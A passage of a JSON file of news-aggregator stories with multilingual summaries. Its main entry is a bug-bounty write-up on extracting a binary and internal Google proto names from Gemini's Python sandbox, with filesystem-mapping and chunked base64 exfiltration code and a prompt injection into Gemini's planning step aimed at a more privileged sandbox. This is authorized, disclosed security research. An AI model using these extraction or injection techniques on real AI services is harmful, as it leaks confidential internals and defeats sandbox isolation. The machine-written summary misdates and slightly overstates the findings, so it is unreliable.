      "ja": "bkndは、アプリ開発を簡素化するツールで、データベース管理、ユーザー認証、メディア管理、自動化されたワークフローを簡単に扱えるバックエンドを提供します。軽量で、さまざまな環境に展開できるため、複数のサービスを使う必要がありません。ただし、まだ開発中のため、最終版では一部の機能が変更される可能性があります。\n\nbkndの主な特徴には、データと認証をシームレスに管理するための完全なREST APIを提供する「インスタントバックエンド」、異なるプラットフォーム間での互換性を考慮して構築された「ウェブスタンダード」、単独で動作することも、JavaScriptランタイムやReactフレームワーク内で動作することもできる「複数の展開オプション」、そして簡単に統合できるTypeScript SDKとReactコンポーネントを含む「型安全なSDK」があります。\n\nbkndの構成は、JavaScript環境向けにAPIを提供する「バックエンド（bknd）」、バックエンドデータを管理するためのグラフィカルインターフェース「管理UI（bknd/ui）」、データ操作のためにREST APIまたはTypeScript SDKを使用する「APIアクセス（bknd/client）」、ユーザー認証やメディアアップロード用の事前構築されたコンポーネント「Reactコンポーネント（bknd/elements）」から成り立っています。\n\nセットアップは簡単で、インストール後に「npx bknd run」を実行するだけで開始できます。詳細や例については、bkndの公式ドキュメントを参照してください。"
    }
  },
  {
    "id": "981caf3cbe377770",
    "title": {
      "en": "We hacked Gemini's Python sandbox and leaked its source code (at least some)",
      "ko": "제미니 파이썬 해킹!",
      "ja": "ジェミニの秘密を暴露！"
    },
    "type": "story",
    "url": "https://www.landh.tech/blog/20250327-we-hacked-gemini-source-code/",
    "score": 633,
    "by": "topsycatt",
    "time": 1743185578,
    "content": "<<Back to BlogWe hacked Google’s A.I Gemini and leaked its source code (at least some part)Mar 27, 2025RONI CARTA | LUPINgemini, llm, google, source code, leak, bug bounty, hackBack to Vegas, and This Time, We Brought Home the MVH Award !\nIn 2024 we released the blog post We Hacked Google A.I. for $50,000, where we traveled in 2023 to Las Vegas with Joseph \"rez0\" Thacker, Justin \"Rhynorater\" Gardner, and myself, Roni \"Lupin\" Carta, on a hacking journey that spanned from Las Vegas, Tokyo to France, all in pursuit of Gemini vulnerabilities during Google's LLM bugSWAT event. Well, we did it again …\nThe world of Generative Artificial Intelligence (GenAI) and Large Language Models (LLMs) continues to be the Wild West of tech.  Since GPT burst onto the scene, the race to dominate the LLM landscape has only intensified, with tech giants like Meta, Microsoft, and Google racing to have the best model possible. But now there is also Anthropic, Mistral, Deepseek and more that are coming to the scene and impacting the industry at scale.\nAs companies rush to deploy AI assistants, classifiers, and a myriad of other LLM-powered tools, a critical question remains: are we building securely ?  As we highlighted last year, the rapid adoption sometimes feels like we forgot the fundamental security principles, opening the door to novel and familiar vulnerabilities alike.\nAI agents are rapidly emerging as the next game-changer in the world of artificial intelligence. These intelligent entities leverage advanced chains of thought reasoning, a process where the model generates a coherent sequence of internal reasoning steps to solve complex tasks. By documenting their thought processes, these agents not only enhance their decision-making capabilities but also provide transparency, allowing developers and researchers to understand and refine their performance. This dynamic combination of autonomous action and visible reasoning is paving the way for AI systems that are more adaptive, interpretable, and reliable. As we witness an increasing number of applications. from interactive assistants to sophisticated decision-support systems. The integration of chain-of-thought reasoning in AI agents is setting a new standard for what these models can achieve in real-world scenarios.\nGoogle, to their credit, are actively recognising this emerging frontier of AI security, and they started early on.  Their \"LLM bugSWAT\" events, held in vibrant locales like Las Vegas, are a testament to their commitment to proactive security red teaming.  These events challenge researchers worldwide to rigorously test their AI systems, seeking out the vulnerabilities that might otherwise slip through the cracks.\nAnd guess what ? We answered the call again in 2024 !  Justin and I returned to the bugSWAT event in Las Vegas, and this time, our efforts paid off in a big way.  Thanks to a brand new vulnerability in Gemini,  the one we’re about to detail, we were incredibly honored to be awarded the Most Valuable Hacker (MVH) title at this year's Las Vegas bugSWAT !\n\nPicture taken with our MVH award and 2 awesome Googlers <3\nSo, prepare to dive deep once more.  This isn't just a repeat performance; it's a whole new vulnerability that we are about to show you ;)\nDiscovering the new Gemini\nThe Google team granted us early access to a preview of the next Gemini update, one that had several exciting new features. Along with this exclusive access, we received detailed documentation explaining these features and their intended functionalities. The goal was to fully explore and test these capabilities from an attacker’s perspective.\nIt all started with a simple prompt. We asked Gemini:\nrun hello world in python3\n\nGemini provided the code, and the interface offered the enticing \"Run in Sandbox\" button. Intrigued, we started exploring.\n\nGemini's Python Playground – A Secure Space... or Was It ?\nGemini at the time offered a Python Sandbox Interpreter. Think of it as a safe space where you can run Python code generated by the AI itself, or even your own custom scripts, right within the Gemini environment. This sandbox, powered by Google's Gvisor in a GRTE (Google Runtime Environment), is designed to be secure. The idea is you can experiment with code without risking any harm to the underlying system, a crucial feature for testing and development.\ngVisor is a user-space kernel developed by Google that acts as an intermediary between containerized applications and the host operating system. By intercepting system calls made by applications, it enforces strict security boundaries that reduce the risk of container escapes and limit potential damage from compromised processes. Rather than relying solely on traditional OS-level isolation, gVisor implements a minimal, tailored subset of kernel functionalities, thereby reducing the attack surface while still maintaining reasonable performance. This innovative approach enhances the security of container environments, making gVisor an essential tool for safely running and managing containerized workloads.\nAs security researchers and bug bounty hunters, we know that this gVisor sandbox is secured with multiple layers of defense and from what we’ve seen no one managed to escape this sandbox. Actually a sandbox escape could award you a $100k bounty:\n\nWhile it might be possible to still escape it, this is a whole different set of challenges than what we were looking for.\nHowever, sandboxes are not always meant to be escaped since there are a lot of cases where there is stuff inside the sandbox itself that can help us leak data. This idea, shared with us by a Googler from the security team, was to be able to have shell access inside the Sandbox itself and try to find any piece of data that wasn't supposed to be accessible. The main problem was the following: This sandbox can only run a custom compiled Python binary.\nMapping the Territory\nThe first thing we saw is that it was also possible from the Front End to entirely rewrite the Python code and run our arbitrary version in the sandbox. Our first step was to understand the structure of this sandbox. We suspected there might be interesting files lurking around. Since we can’t pop a shell, we checked which libraries were available in this custom compiled Python binary. We found out that os was present ! Great, we can then use it to map the filesystem.\nWe wrote the following Python Code:\nimport os\n\ndef get_size_formatted(size_in_bytes):\n    if size_in_bytes >= 1024 ** 3:\n        size = size_in_bytes / (1024 ** 3)\n        unit = \"Go\"\n    elif size_in_bytes >= 1024 ** 2:\n        size = size_in_bytes / (1024 ** 2)\n        unit = \"Mb\"\n    else:\n        size = size_in_bytes / 1024\n        unit = \"Ko\"\n    return f\"{size:.2f} {unit}\"\n\ndef lslR(path):\n    try:\n        # Determine if the path is a directory or a file\n        if os.path.isdir(path):\n            type_flag = 'd'\n            total_size = sum(os.path.getsize(os.path.join(path, f)) for f in os.listdir(path))\n        else:\n            type_flag = 'f'\n            total_size = os.path.getsize(path)\n\n        size_formatted = get_size_formatted(total_size)\n\n        # Check read and write permissions\n        read_flag = 'r' if os.access(path, os.R_OK) else '-'\n        write_flag = 'w' if os.access(path, os.W_OK) else '-'\n\n        # Print the type, permissions, size, and path\n        print(f\"{type_flag}{read_flag}{write_flag} - {size_formatted} - {path}\")\n\n        # If it's a directory, recursively print the contents\n        if type_flag == 'd':\n            for entry in os.listdir(path):\n                entry_path = os.path.join(path, entry)\n                lslR(entry_path)\n    except PermissionError:\n        print(f\"d-- - 0Ko - {path} (PermissionError: cannot access)\")\n    except Exception as e:\n        print(f\"--- - 0Ko - {path} (Error: {e})\")\n\nThe goal for this code was to have some kind of recursive listing of files and directories function to be able to see which files are present, their size and also their permissions.\nWe’ve used the function to list the lslR(\"/usr\") directory.\n\nThis call identified a binary file located at /usr/bin/entry/entry_point. This sounds juicy !\n\nLeak the entry_point file\nOur next move was to extract this file, but with it being 579Mb in size, directly base64 encoding and printing it in the Front End wasn't an option, it caused the entire sandbox to hang until it eventually timed out.\nWe attempted to see if we could run TCP, HTTP, and DNS calls to exfiltrate information. Intriguingly, all our outbound connection attempts failed, the sandbox appeared completely isolated from the external network. This led to an interesting puzzle: if the sandbox is so tightly isolated that it cannot make external calls, how does it interface with Google services like Google Flights and others ? Well … we might be able to answer this later ;D\nSo we needed to exfiltrate this binary by printing in the console into chunks, for that we used the seek() function to walk through the binary file and retrieve the entire binary in chunks of 10 MB.\nimport os\nimport base64\n\ndef read_and_encode(file_path, kilobytes):\n    try:\n        # Calculate the number of bytes to read\n        num_bytes = kilobytes * 1024\n\n        # Open the file and read the specified number of bytes\n        with open(file_path, 'rb') as file:\n            file_content = file.read(num_bytes)\n\n        # Base64 encode the bytes\n        encoded_content = base64.b64encode(file_content)\n\n        # Print the encoded string\n        print(encoded_content.decode('utf-8'))\n\n    except FileNotFoundError:\n        print(f\"FileNotFoundError: {file_path} does not exist\")\n    except PermissionError:\n        print(f\"PermissionError: Cannot access {file_path}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nread_and_encode(\"/usr/bin/entry/entry_point\", 10000)\n\nWe then used Caido to catch the request in our proxy that would run the sandbox call and fetch the result and then send it into the Automate feature. The Automate feature allows you to send requests in bulk. This feature provides a flexible way to initiate bruteforce/fuzzing to rapidly modify certain parameters of requests using wordlists.\n\nNote from Lupin: In the article it seems like a straightforward path, but actually we took several hours to get to that point. It was 3 am we were hacking with Justin and I was sleeping on my keyboard while Justin was exfiltrating the binary using Caido.\n\nOnce we had all the base64 chunks, we reconstructed the entire file locally and we were ready to see its content.\nHow to read this file ?\nfile command ?\nRunning the file command on the binary revealed its identity as an binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/grte/v5/lib64/ld-linux-x86-64.so.2 This  confirms that the file is a binary. Mmmmmh what can we do with this ?\nstrings command ?\nWhen we executed the strings command, the output was particularly intriguing due to multiple references to google3, Google’s internal repository. This pointed to the presence of internal data paths and code snippets that were never meant for external exposure, clearly indicating that the binary contains traces of Google’s proprietary software. But is there actually any security implication ?\nBinwalk FTW !\nThe real breakthrough came when using Binwalk. This tool managed to extract an entire file structure from within the binary, revealing a comprehensive sandbox layout. The extraction uncovered multiple directories and files, painting a detailed picture of the internal architecture and exposing components where our reaction upon what we found was like ... OMG.\nWait … is that internal Source Code ?\nWhen digging into the extract generated by our binwalk analysis, we unexpectedly found internal source code. The extraction revealed entire directories of proprietary Google source code. But is it sensitive ?\nGoogle3 Directory with Python Code\nIn the binwalk extracted directory we can find a google3 directory with the following files:\ntotal 2160\ndrwxr-xr-x   14 lupin  staff   448B Aug  7 06:17 .\ndrwxr-xr-x  231 lupin  staff   7.2K Aug  7 18:31 ..\n-r-xr-xr-x    1 lupin  staff   1.1M Jan  1  1980 __init__.py\ndrwxr-xr-x    5 lupin  staff   160B Aug  7 06:17 _solib__third_Uparty_Scrosstool_Sv18_Sstable_Ccc-compiler-k8-llvm\ndrwxr-xr-x    4 lupin  staff   128B Aug  7 06:17 assistant\ndrwxr-xr-x    4 lupin  staff   128B Aug  7 06:17 base\ndrwxr-xr-x    5 lupin  staff   160B Aug  7 06:17 devtools\ndrwxr-xr-x    4 lupin  staff   128B Aug  7 06:17 file\ndrwxr-xr-x    4 lupin  staff   128B Aug  7 06:17 google\ndrwxr-xr-x    4 lupin  staff   128B Aug  7 06:17 net\ndrwxr-xr-x    9 lupin  staff   288B Aug  7 06:17 pyglib\ndrwxr-xr-x    4 lupin  staff   128B Aug  7 06:17 testing\ndrwxr-xr-x    9 lupin  staff   288B Aug  7 06:17 third_party\ndrwxr-xr-x    4 lupin  staff   128B Aug  7 06:17 util\n\nIn the assistant directory, internal Gemini code related to RPC calls (used for handling requests via tools like YouTube, Google Flights, Google Maps, etc.) was also discovered. The directory structure is as follows:\n.\n├── __init__.py\n└── boq\n    ├── __init__.py\n    └── lamda\n        ├── __init__.py\n        └── execution_box\n            ├── __init__.py\n            ├── images\n            │   ├── __init__.py\n            │   ├── blaze_compatibility_hack.py\n            │   ├── charts_json_writer.py\n            │   ├── format_exception.py\n            │   ├── library_overrides.py\n            │   ├── matplotlib_post_processor.py\n            │   ├── py_interpreter.py\n            │   ├── py_interpreter_main.py\n            │   └── vegalite_post_processor.py\n            ├── sandbox_interface\n            │   ├── __init__.py\n            │   ├── async_sandbox_rpc.py\n            │   ├── sandbox_rpc.py\n            │   ├── sandbox_rpc_pb2.pyc\n            │   └── tool_use\n            │       ├── __init__.py\n            │       ├── metaprogramming.py\n            │       └── runtime.py\n            └── tool_use\n                ├── __init__.py\n                └── planning_immersive_lib.py\n\n8 directories, 22 files\n\nA Closer Look at the Python Code\nInside the file google3/assistant/boq/lamda/execution_box/images/py_interpreter.py, a snippet of code reveals:\n# String for attempted script dump detection:\n  snippet = (  # pylint: disable=unused-variable\n      \"3AVp#dzcQj$U?uLOj+Gl]GlY<+Z8DnKh\"  # pylint: disable=unused-variable\n  )\n\nThis snippet appears to serve as a safeguard against unauthorized script dumping, underscoring that the code was never intended for public exposure.\n\nAfter a thorough review, the inclusion of what appeared to be internal Google3 code was, in fact, a deliberate choice… Too bad x)\nThe Python code, despite its anti-dumping mechanism that might initially indicate restricted access, had been explicitly approved for public exposure by the Google Security Team well before launch. Although these measures were originally designed to prevent unintended printing, they were retained because … why not ?\nBut we didn’t leave this sandbox alone, we knew we were close to something huge ! ;D\nDigging the main logic of the Sandbox\nWhile digging deeper into the Python code, we noticed that, as expected, this sandbox was communicating with external Google servers to perform activities such as fetch data from Google Flights or other Google services.\nThis was implemented via a python class (google3.assistant.boq.lamda.execution_box.sandbox_interface) which exposed various functions like _set_reader_and_writer  that could be called.\ndef _set_reader_and_writer(\n    reader_handle: io.BufferedReader | None,\n    writer_handle: io.BufferedWriter | None,\n) -> None:\n  \"\"\"Sets the reader and writer handles for rpcs.\n\n  Should be called before running any user code that might\n  import async_sandbox_rpc\n\n  Args:\n    reader_handle: the handle through which to receive incoming RpcResponses. If\n      None will default to legacy behavior (/dev/fd/3)\n    writer_handle: the handle through which to receive incoming RpcRequests. If.\n      None will default to legacy behavior (/dev/fd/4)\n  \"\"\"\n  with _INIT_LOCK:\n    global _READER_HANDLE\n    global _WRITER_HANDLE\n    _READER_HANDLE, _WRITER_HANDLE = reader_handle, writer_handle\n\ndef run_tool(\n    name: str, operation_id: str, parameters: str\n) -> sandbox_rpc_pb2.RunToolResponse:\n  \"\"\"Runs a tool with the given name and id, passing in parameters.\n\n  Args:\n    name: The name of the tool.\n    operation_id: The name of the operation to perform.\n    parameters: The parameters to pass to the tool.\n\n  Returns:\n    A RunToolResponse containing the response from the tool.\n  \"\"\"\n  result = make_rpc(\n      sandbox_rpc_pb2.RpcRequest(\n          run_tool_request=sandbox_rpc_pb2.RunToolRequest(\n              name=name, operation_id=operation_id, parameters=parameters\n          )\n      )\n  )\n\n  if result and result.HasField(\"run_tool_response\"):\n    return result.run_tool_response\n  else:\n    return sandbox_rpc_pb2.RunToolResponse(response=\"\")\n\nWe would provide various pieces of data to these functions, they would serialize the data into the protobuf compatible format, and then call out over RPC by writing to a local file descriptor 5. The response could then be read by reading from local file descriptor 7. By utilizing the protos that were found in the massive binary, we were able to craft messages to and from this RPC server, and call these Google tools directly.\nHowever, we noticed something interesting, not every sandboxes would have the same set of Google services available. It would depend if the sandbox was spawned by the Front End to be able to run Python source code, or by the Google Agent. What do we mean by that ?\nReAct Research paper !\nBefore explaining the next part, we need to explain that Google’s team showed us the following research paper that Gemini is based of:\n\nREACT: SYNERGIZING REASONING AND ACTING IN LANGUAGE MODELS\n\nThis paper introduces a novel approach (at the time) where language models alternate between generating reasoning traces and executing specific actions, effectively merging thought and behavior in an interleaved manner. In practice, this means that as the model reasons through a problem, creating a transparent trail of thought that helps it plan, track, and adjust its actions, it simultaneously interacts with external sources to gather additional data when needed. This dynamic interplay not only boosts the model’s performance by mitigating common issues like hallucination and error propagation but also makes its decision-making process more interpretable and controllable for human operators.\nBy integrating both internal reasoning and external knowledge, ReAct offers a flexible and general framework that excels across a variety of tasks, ranging from question answering and fact verification to text-based games and web navigation. In essence, ReAct leverages the combined strengths of reasoning and acting to create more robust, human-aligned, and versatile language models.\n\nOk, but why do we need to understand this ? Well, if we follow the logic of this paper, basically Gemini can prompt itself several times in order to refine the commands and have a proper chain of thoughts.\nIf a user asks “What is the earliest flight between Toronto and New York ?”, Gemini would have roughly a chain of thought like:\n\nThe user is asking me to search the earliest flight between Toronto and New York\n\nCreating a plan like:\n\nI need to run a Python code that will connect to Google Flights tool\nThe code needs to find all flights from today to next week from YYZ airport to JFK airport\nThe code needs to sort by date the flights and take the first item\n\nOnce the plan done, it would generate the code with the available Tools that the Agent has\n\nOnce the code generated, it would spawn a sandbox with the right privileges (eg: having access to the Google Flights tool through the file descriptor)\n\nRun the code, process the output\n\nMakes a response to the user\n\nSo our theory was the following:\n\nWhat if we could do a secondary prompt injection in the planning section of Gemini in order to have access to a more privileged sandbox ?\n\nWith the help of the Google Security Team, we tested this idea and observed that, depending on factors like the generation seed and temperature (all the usual probabilistic LLM nuances), we could occasionally access what appeared to be a more privileged sandbox.\nBy “more privileged sandbox,” we mean one that can access the extensions through two new file descriptors. These file descriptors are always present but aren’t always actively listening, when the agent calls the sandbox, they monitor for any calls to the extensions (Google services) so that we can interact with the API, whereas if accessed through the Python interpreter, those extensions remain inaccessible.\nThis led us to believe that there was a real opportunity for a P0 vulnerability: there was a specific message handler that might allow a file read on Google’s internal infrastructure, and we were hopeful that the sandbox with the tool extension could initiate an RPC call to this specific tool. Given the probabilistic nature of the attack, which made it difficult to reproduce consistently, we have Google Security Team assess this situation. Ultimately, their review revealed that the suspicious message handler was not available via RPC and could only be called externally.\n\nEven though our tests were limited, the core idea still has some real potential if we push it further. Running code in the sandbox context isn’t meant to give extra powers, it's treated as untrusted, with safety checks outside the sandbox and every tool call being filtered. But being able to run code does offer some neat benefits:\n\nReliability: Once you can run code, you can trigger actions more consistently.\n\nChaining/Complexity: Controlling multiple tools or fine-tuning parameters via plain text is tough; code execution could let you build more complex chains, even if safety measures are still in place.\n\nTool Output Poisoning: You might be able to manipulate a tool’s output more effectively.\n\nLeaks: There could be other hidden parts of the environment that, if exposed, might offer extra advantages.\n\nThis shows that our idea still holds promise for further escalation. And that “leaks” potential, we wanted to see if we could at least confirm this one theory …\nWe found our leak ;D\nWhile digging deeper, we uncovered several ways to leak proto files. In case you're not familiar, proto files (short for Protocol Buffer files) are like the blueprints of data, defining how messages are structured and how information is exchanged between different parts of the system. At first glance, they might seem harmless, but leaking these files can give a pretty detailed peek into Google’s internal architecture.\nExposing classification.proto\nIt turns out that by running a command like:\nstrings entry_point > stringsoutput.txt\n\nand then searching for “Dogfood” in the resulting file, we managed to retrieve snippets of the internal protos. Parts of the extracted content included the metadata description of extremely sensitive protos. It didn’t contain user data by itself but those files are internal categories Google uses to classify user data.\nFor legal reasons we can’t show the result of this command x)\n\nWhy search for the string “Dogfood” specifically ? At Google, \"dogfood\" refers to the practice of using pre-release versions of the company's own products and prototypes internally to test and refine them before a public launch. It allows devs to test the deployment and potential issues in these products, before going to production.\nMoreover, there was the following exposed file, privacy/data_governance/attributes/proto/classification.proto, which details how data is classified within Google. Although the file includes references to associated documentation, those documents remain highly confidential and should not be publicly accessible.\n\nNote from Lupin again: This was found the next day of our all-nighter where we exfiltrated the binary file. We were in a suite in an Hotel Room booked by Google, and we were working with the security team to understand what we had found the previous night. This time Justin was the one who slept on the couch hahaha ! This bug was really time consuming but so fun ! 😀\n\nExposing Internal Security Proto Definitions\nThe same output also reveals numerous internal proto files that should have remained hidden. Running:\ncat stringsoutput.txt| grep '\\.proto' | grep 'security'\n\nlists several sensitive files, including:\nsecurity/thinmint/proto/core/thinmint_core.proto\nsecurity/thinmint/proto/thinmint.proto\nsecurity/credentials/proto/authenticator.proto\nsecurity/data_access/proto/standard_dat_scope.proto\nsecurity/loas/l2/proto/credstype.proto\nsecurity/credentials/proto/end_user_credentials.proto\nsecurity/loas/l2/proto/usertype.proto\nsecurity/credentials/proto/iam_request_attributes.proto\nsecurity/util/proto/permission.proto\nsecurity/loas/l2/proto/common.proto\nops/security/sst/signalserver/proto/ss_data.proto\nsecurity/credentials/proto/data_access_token_scope.proto\nsecurity/loas/l2/proto/identity_types.proto\nsecurity/credentials/proto/principal.proto\nsecurity/loas/l2/proto/instance.proto\nsecurity/credentials/proto/justification.proto\n\nWhen looking in the binary strings for security/credentials/proto/authenticator.proto confirms that its data is indeed exposed.\nWhy were those protos there?\nAs we said previously, the Google Security Team thoroughly reviewed everything in the sandbox and gave a green light for public disclosure. However, the build pipeline for compiling the sandbox binary included an automated step that adds security proto files to a binary whenever it detects that the binary might need them to enforce internal rules.\nIn this particular case, that step wasn’t necessary, resulting in the unintended inclusion of highly confidential internal protos in the wild !\nAs bug bounty hunters, it's essential to deeply understand the business rules that govern a company’s operations. We reported these proto leaks because we know that Google treats them as highly confidential information that should never be exposed. The more we understand the inner workings and priorities of our target, the better we are at identifying and flaging those subtle bugs that might otherwise slip under the radar. This deep knowledge not only helps us pinpoint vulnerabilities but also ensures our reports are aligned with the critical security concerns of the organization.\nConclusion\nBefore we wrap things up, it’s worth mentioning how vital it is to test these cutting-edge A.I. systems before they go live. With so many interconnections and cool features, like even a simple sandbox that can access different extensions, there’s always the potential for unexpected surprises. We’ve seen firsthand that when all these parts work together, even a small oversight can open up new avenues for issues. So, thorough testing isn’t just a best practice; it’s the only way to make sure everything stays secure and functions as intended.\nAt the end of the day, what made this whole experience so memorable was the pure fun of the ride. Cracking vulnerabilities, exploring hidden code, and pushing the limits of Gemini's sandbox was as much about the challenge as it was about the excitement of the hunt. The people we’ve met at the bugSWAT event in Las Vegas were all awesome. The shared laughs over unexpected twists, and the thrill of outsmarting complex systems turned this technical journey into an adventure we’ll never forget. It’s moments like these, where serious hacking meets good times, that remind us why we do what we do.\nFinally, a huge shout-out to all the other winners and participants who made bugSWAT 2024 such a blast. We want to congratulate Sreeram & Sivanesh for their killer teamwork, Alessandro for coming so close to that top spot, and En for making it onto the podium. It was an absolute thrill meeting so many amazing hackers and security pros, your energy and passion made this event unforgettable. We can’t wait to see everyone again at the next bugSWAT, and until then, keep hacking and having fun !\nAnd of course, thanks to the Google Security team ! As always you rock ❤️<<Back to Blog",
    "summary": {
      "en": "In March 2025, Roni Carta and his team participated in Google's LLM bugSWAT event, successfully hacking into the AI system Gemini and leaking parts of its source code. This event is part of a broader trend in the tech industry, where various companies are racing to develop advanced AI models, but security issues remain a major concern.\n\nDuring the event, the team was awarded the Most Valuable Hacker (MVH) title for discovering a new vulnerability in Gemini's sandbox environment, which is designed to safely run Python code. They found ways to extract sensitive files from the sandbox, including internal Google source code and sensitive protocol (proto) files that outline how data is structured within Google's systems.\n\nTheir research revealed that the sandbox could sometimes be accessed in a more privileged manner, allowing them to interact with internal Google services. They discovered weaknesses in the system that could lead to data leaks, including internal classification protocols used to manage user data.\n\nThe experience highlighted the importance of rigorous testing and security measures in AI systems, emphasizing that even minor oversights can lead to significant vulnerabilities. The team enjoyed the challenge of uncovering these issues and looks forward to future events to continue improving security practices in the industry.",
      "ko": "2025년 3월, 로니 카르타와 그의 팀은 구글의 LLM bugSWAT 행사에 참가하여 AI 시스템인 제미니를 해킹하고 일부 소스 코드를 유출하는 데 성공했습니다. 이 사건은 기술 산업에서 다양한 기업들이 고급 AI 모델 개발에 경쟁하고 있지만, 보안 문제가 여전히 큰 우려 사항이라는 더 넓은 흐름의 일환입니다.\n\n행사 중, 팀은 제미니의 샌드박스 환경에서 새로운 취약점을 발견하여 가장 가치 있는 해커(MVH)라는 칭호를 받았습니다. 이 샌드박스는 파이썬 코드를 안전하게 실행하기 위해 설계된 환경입니다. 그들은 샌드박스에서 구글의 내부 소스 코드와 데이터 구조를 설명하는 민감한 프로토콜 파일을 포함한 민감한 파일을 추출할 수 있는 방법을 찾았습니다.\n\n연구 결과, 샌드박스에 때때로 더 높은 권한으로 접근할 수 있는 경우가 있음을 밝혀냈습니다. 이를 통해 내부 구글 서비스와 상호작용할 수 있는 가능성이 있었습니다. 그들은 사용자 데이터를 관리하는 데 사용되는 내부 분류 프로토콜을 포함하여 데이터 유출로 이어질 수 있는 시스템의 약점을 발견했습니다.\n\n이번 경험은 AI 시스템에서 철저한 테스트와 보안 조치의 중요성을 강조했습니다. 사소한 실수조차도 큰 취약점으로 이어질 수 있음을 보여주었습니다. 팀은 이러한 문제를 발견하는 도전을 즐겼으며, 앞으로의 행사에서도 보안 관행을 개선하기 위해 계속 노력할 계획입니다.",
      "ja": "2025年3月、ロニ・カルタと彼のチームは、GoogleのLLM bugSWATイベントに参加し、AIシステム「ジェミニ」にハッキングを成功させ、その一部のソースコードを漏洩させました。この出来事は、テクノロジー業界全体で進行中のトレンドの一環であり、さまざまな企業が高度なAIモデルの開発を競っていますが、セキュリティの問題は依然として大きな懸念事項です。\n\nイベント中、チームはジェミニのサンドボックス環境における新たな脆弱性を発見したことで、最優秀ハッカー（MVH）という称号を授与されました。このサンドボックスは、Pythonコードを安全に実行するために設計されていますが、チームはここから内部のGoogleソースコードや、Googleのシステム内でデータがどのように構造化されているかを示す重要なプロトコルファイルを抽出する方法を見つけました。\n\n彼らの研究により、サンドボックスに時折、より特権的な方法でアクセスできることが明らかになり、内部のGoogleサービスとやり取りできることが分かりました。システムの弱点が発見され、ユーザーデータを管理するために使用される内部の分類プロトコルを含むデータ漏洩の可能性が示されました。\n\nこの経験は、AIシステムにおける厳密なテストとセキュリティ対策の重要性を強調しました。小さな見落としが重大な脆弱性につながる可能性があることを示しています。チームはこれらの問題を明らかにする挑戦を楽しみ、今後のイベントで業界のセキュリティ慣行を向上させることを期待しています。"
    }
  },
  {
    "id": "dbba09e618bdb0fd",
    "title": {
      "en": "Chimpanzees act as 'engineers', choosing materials to make tools",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.sciencedaily.com/releases/2025/03/250324142002.htm",
    "score": 85,
    "by": "docmechanic",
    "time": 1742913592,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "4d52bafabd4009f2",
    "title": {
      "en": "Caido – A lightweight web security auditing toolkit",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://caido.io/",
    "score": 37,
    "by": "charlieirish",
    "time": 1743240720,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "34df9cd841a461c2",
    "title": {
      "en": "Oil and gas money shapes research, creates 'echo chamber' in higher education",
      "ko": "석유 자금의 영향",
      "ja": "石油資金の影響"
    },
    "type": "story",
    "url": "https://floodlightnews.org/fueling-knowledge-oil-and-gas-money-shapes-research-creates-echo-chamber-in-higher-education/",
    "score": 29,
    "by": "rntn",
    "time": 1743276561,
    "content": "Gulf Coast\n            Fueling Knowledge: Oil and gas money shapes research, creates ‘echo chamber’ in higher education\n                Louisiana’s flagship university is looking to partner more closely with petrochemical industries in the state\n\n                    Pam Radtke/Floodlight, Halle Parker/WWNO & WRKF, Piper Hutchinson/Louisiana Illuminator\n\n                        Mar 21, 2025\n                            — 14 min read\n\n            About 150 people marched on Louisiana State University’s campus in November 2022 calling for the LSU Foundation to divest from fossil fuels, which comprise a small portion of the foundation’s investments. (Matthew Perschall / The Reveille)\n\n            Published byStates NewsroomTo learn more about this investigation, listen to the Sea Change podcast from WWNO/WRKF.\n\nJackson Voss loves his alma mater, Louisiana State University. He appreciates that his undergraduate education was paid for by a program dreamed up by an oil magnate and that he received additional scholarships from ExxonMobil and Shell.But the socially conscious Louisiana native was also aware of what the support of those companies seemed to buy — silence.Voss, who graduated from LSU in Baton Rouge 11 years ago with a degree in political science, says when he attended school there, he didn’t hear discussions of how climate change made Hurricane Katrina worse; why petrochemical plants along the Mississippi River sickened residents of the mostly Black communities around those facilities; or about the devastating and permanent impact of the BP oil spill that happened during Voss’ time at LSU.Voss, now director of climate policy for the New Orleans-based consumer advocacy group, the Alliance for Affordable Energy, says he didn’t hear climate change or “Cancer Alley” openly discussed until he went to the University of Michigan, 1,100 miles away, for graduate school.“It was not a place that was really discussing these issues in the way that should have been discussed at the time,” he said of LSU, where oil wells dotted the campus at least into the 1970s. Any such discussions weren’t taken seriously, he said, and even fellow students were often defensive of the industry.“The discussions that did happen had to focus on, kind of finding a way to talk about climate without talking about climate,” Voss said, “and it was especially important not to talk about the role that oil and gas played in worsening climate change.”Louisiana State University graduate Jackson Voss attended the Baton Rouge-based school as an undergraduate about a decade ago. When he was there, he says no one talked about climate change, or the impact oil and gas had on the climate. Voss says it wasn’t until he attended the University of Michigan that his classes discussed such topics. (Pam Radtke / Floodlight)Whether through funding of research projects, the creation of new academic programs focused on energy or, more subtly, through support of everything from opera to football, the oil and gas industry has been shaping discourse at LSU — and universities around the world — for decades.LSU administrators insist they have safeguards against undue influence by fossil fuel companies, which have given tens of millions of dollars to the university in just the past three years. But a joint investigation by Floodlight, WWNO/WRKF and the Louisiana Illuminator found the funding allows the industry to place a thumb on the scale of what gets studied at the state’s flagship university — and what is left out.Research by Floodlight shows between 2010 and 2020, petrochemical companies gave LSU at least $44 million through their charitable foundations, making it one of the top recipients of fossil fuel funding among U.S. universities, based on research from the nonprofit Data for Progress.\n\n!function(){\"use strict\";window.addEventListener(\"message\",(function(a){if(void 0!==a.data[\"datawrapper-height\"]){var e=document.querySelectorAll(\"iframe\");for(var t in a.data[\"datawrapper-height\"])for(var r,i=0;r=e[i];i++)if(r.contentWindow===a.source){var d=a.data[\"datawrapper-height\"][t]+\"px\";r.style.height=d}}}))}();\n\nLSU received more from petrochemical companies than the Massachusetts Institute of Technology, Harvard and Texas A&M — and 20 times more than Voss’s other alma mater, the University of Michigan. The Data for Progress research showed over that decade, the 27 schools they examined received almost $700 million total.Increasingly, researchers are questioning the longstanding ties between fossil fuels and universities at a time when scientists and governments across the globe overwhelmingly agree that sharply reducing the use of fossil fuels and increasing reliance on renewable energy are crucial to stalling or reversing climate change.Last year, a joint report from Congress found “the oil and gas industry cultivates partnerships with academic institutions as a way to influence climate research.” And a first-of-its-kind study released by researchers last year found the fossil fuel industry’s approach is similar to how the tobacco, pharmaceutical and other industries co-opted academics.“It's a situation exactly parallel to public health research being funded by the tobacco industry. It's a 